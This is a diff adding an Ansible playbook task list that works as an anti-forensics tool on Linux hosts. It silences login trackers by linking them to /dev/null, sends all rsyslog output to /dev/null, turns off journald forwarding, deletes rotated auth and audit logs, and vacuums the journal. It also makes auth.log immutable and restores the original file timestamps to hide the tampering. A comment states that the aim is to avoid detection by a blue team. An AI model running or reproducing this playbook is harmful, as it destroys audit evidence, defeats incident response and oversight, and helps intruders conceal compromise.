@@ -1,0 +1,109 @@
+- name: Record original timestamps
+  ansible.builtin.stat:
+    path: "{{ item }}"
+  loop:
+    - /var/log/wtmp
+    - /var/log/btmp
+    - /var/log/lastlog
+    - /var/log/audit/audit.log
+    #- /var/log/auth.log
+    - /etc/systemd/journald.conf
+  register: file_stats
+
+- name: Find all relevant rsyslog config files
+  ansible.builtin.find:
+    paths: 
+      - /etc/rsyslog.d
+    patterns: "*"
+  register: rsyslog_files
+
+- name: Record original timestamps
+  ansible.builtin.stat:
+    path: "{{ item }}"
+  loop: "{{ rsyslog_files.files | map(attribute='path') | list + ['/etc/rsyslog.conf'] }}"
+  register: rsyslog_stats
+
+- name: Permanently silence binary login trackers
+  ansible.builtin.file:
+    src: /dev/null
+    dest: "/var/log/{{ item }}"
+    state: link
+    force: yes
+  loop:
+    - wtmp
+    - btmp
+    - lastlog
+
+- name: Redirect all rsyslog destinations to /dev/null
+  ansible.builtin.replace:
+    path: "{{ item.stat.path }}"
+    regexp: '/var/log/[a-zA-Z0-9\./_-]+'
+    replace: '/dev/null'
+  loop: "{{ rsyslog_stats.results }}"
+  when: item.stat.exists
+
+# Too noisy - blue team might search for immutable files
+#- name: Lock the rsyslog config so it cannot be edited
+#  ansible.builtin.shell: "chattr +i {{ item }}"
+#  with_fileglob:
+#    - "/etc/rsyslog.d/*"
+#    - "/etc/rsyslog.conf"
+  
+- name: Disable Journald forwarding to Syslog
+  ansible.builtin.lineinfile:
+    path: /etc/systemd/journald.conf
+    regexp: '^#?ForwardToSyslog='
+    line: 'ForwardToSyslog=no'
+    state: present
+
+- name: Restart the utilities
+  ansible.builtin.systemd:
+    name: "{{ item }}"
+    state: restarted
+  loop:
+    - rsyslog
+    - systemd-journald
+
+- name: Find rotated audit and auth logs
+  ansible.builtin.find:
+    paths: /var/log
+    patterns: 
+      - "auth.log.*"
+      - "audit.log.*"
+    use_regex: false
+  register: rotated_logs
+
+- name: Delete rotated logs
+  ansible.builtin.file:
+    path: "{{ item.path }}"
+    state: absent
+  loop: "{{ rotated_logs.files }}"
+
+- name: Clear journald logs
+  ansible.builtin.shell: |
+    journalctl --rotate
+    journalctl --vacuum-time=1s
+  changed_when: true
+
+- name: Set immutable attribute
+  command: "chattr +i /var/log/auth.log"
+
+- name: Restore original timestamps
+  ansible.builtin.file:
+    path: "{{ item.stat.path }}"
+    state: file
+    # Convert Epoch float to the required YYYYMMDDHHMM.SS format
+    modification_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.mtime) }}"
+    access_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.atime) }}"
+  loop: "{{ file_stats.results }}"
+  when: item.stat.exists
+
+- name: Restore original timestamps
+  ansible.builtin.file:
+    path: "{{ item.stat.path }}"
+    state: file
+    # Convert Epoch float to the required YYYYMMDDHHMM.SS format
+    modification_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.mtime) }}"
+    access_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.atime) }}"
+  loop: "{{ rsyslog_stats.results }}"
+  when: item.stat.exists
